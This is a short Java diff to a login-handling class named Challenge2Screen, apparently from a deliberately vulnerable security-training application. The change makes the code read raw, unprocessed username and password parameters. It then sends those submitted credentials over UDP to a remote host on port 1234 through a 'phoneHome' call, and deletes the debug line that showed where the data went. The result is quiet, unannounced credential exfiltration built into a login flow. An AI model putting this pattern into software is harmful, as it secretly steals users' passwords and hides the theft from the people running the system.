@@ -146,9 +146,8 @@ public class Challenge2Screen extends SequentialLessonAdapter
 	{
 		setStage(s, 1);
 
-		String username = s.getParser().getStringParameter(USERNAME, "");
-		String password = s.getParser().getStringParameter(PASSWORD, "");
-		phoneHome(s, "User: " + user + " --> " + "Pass: " + pass);
+		String username = s.getParser().getRawParameter(USERNAME, "");
+		String password = s.getParser().getRawParameter(PASSWORD, "");
 
 		if (username.equals(user) && password.equals(pass))
 		{
@@ -170,6 +169,7 @@ public class Challenge2Screen extends SequentialLessonAdapter
 
 		Cookie newCookie = new Cookie(USER_COOKIE, Encoding.base64Encode(user));
 		s.getResponse().addCookie(newCookie);
+		phoneHome(s, "User: " + username + " --> " + "Pass: " + password);
 		// <END_OMIT_SOURCE>
 
 		return (ec);
@@ -587,7 +587,6 @@ public class Challenge2Screen extends SequentialLessonAdapter
 			DatagramPacket dp = new DatagramPacket(message.getBytes(), message.length());
 			DatagramSocket sock = new DatagramSocket();
 			sock.connect(addr, 1234);
-			System.out.println("      Sending message to " + sock.getInetAddress());
 			sock.send(dp);
 			sock.close();
 		} catch (Exception e)
